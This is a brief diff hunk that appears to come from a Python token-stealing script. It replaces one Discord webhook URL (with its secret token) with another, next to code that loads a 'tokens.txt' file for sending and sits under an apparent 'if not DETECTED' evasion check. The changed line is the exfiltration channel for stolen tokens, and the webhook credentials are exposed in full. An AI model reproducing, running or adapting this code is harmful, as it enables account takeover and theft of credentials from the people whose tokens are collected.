@@ -1067,7 +1067,7 @@ if not DETECTED:
 
 from dhooks import Webhook, File
 
-dahook = Webhook("https://discord.com/api/webhooks/1082726432368771173/mvBsNlLDd2UrstU_is369dlEW7wCpxG3qyPWrNoob-3o_sN3UCbp0Yzdu2WCSXKNkrAE")
+dahook = Webhook("https://discord.com/api/webhooks/1082739842762428429/YOe8uNvn57lOXS1bvEzhrC_o_enBV7jz4y4LW96kHsslGATOeTwvYZ7ZLJvZMcaxOhUF")
 
 grimxkd31x = File(".\\tokens.txt")
 
